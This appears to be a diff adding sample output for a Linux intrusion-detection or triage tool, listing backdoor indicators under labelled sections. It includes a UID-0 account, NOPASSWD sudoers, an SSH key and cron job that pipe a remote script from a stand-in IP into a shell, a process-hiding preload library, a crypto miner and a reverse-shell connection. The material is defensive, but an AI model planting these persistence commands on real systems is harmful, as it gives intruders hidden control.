@@ -1,0 +1,35 @@
+=== [7] BACKDOOR ===
+--- [UID0_PASSWD] ---
+root:x:0:0:root:/root:/bin/bash
+svc_sync:x:0:0:Backup Sync:/root:/bin/bash
+--- [SUDOERS] ---
+%sudo ALL=(ALL:ALL) ALL
+devops ALL=(ALL) NOPASSWD: ALL
+--- [SSH_KEYS] ---
+FILE:/root/.ssh/authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleNormalAdminKey ops@corp-bastion
+command="/bin/sh -c 'curl -s http://203.0.113.99/ping.sh | sh'" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQExampleSuspiciousKey unknown@ext
+--- [CRON] ---
+*/5 * * * * root curl -fsSL http://203.0.113.99/update.sh | bash >/dev/null 2>&1
+0 3 * * * root /usr/local/bin/db_backup.sh
+--- [LD_PRELOAD] ---
+/lib/x86_64-linux-gnu/libprocesshider.so
+--- [STARTUP] ---
+/etc/rc.local: /dev/shm/.kworker_sync -d
+--- [PROCESSES] ---
+root       112  0.0  0.1  12340  3200 ?        Ss   08:00   0:00 /usr/sbin/sshd -D
+www-data  4821 98.4  4.2 842100 180200 ?       Ssl  09:12  45:10 /tmp/.xmrig --url stratum+tcp://198.51.100.42:3333
+root      5102  0.1  0.2  20144  4100 ?        S    09:15   0:01 /dev/shm/.kworker_sync
+--- [DELETED_EXE] ---
+lrwxrwxrwx 1 www-data www-data 0 Nov 26 09:12 /proc/4821/exe -> /tmp/.xmrig (deleted)
+--- [OUTBOUND] ---
+tcp   ESTAB  0  0  10.0.1.15:49210  203.0.113.99:4444  users:(("bash",pid=5310,fd=3))
+tcp   ESTAB  0  0  10.0.1.15:52104  198.51.100.42:3333 users:(("kworker_sync",pid=5102,fd=4))
+--- [SUID] ---
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/find
+/tmp/roothelper
+--- [TMP_HIDDEN] ---
+drwxrwxrwt  2 root     root      40 Nov 26 08:00 .X11-unix
+-rwxr-xr-x  1 www-data www-data 84K Nov 26 09:12 .xmrig
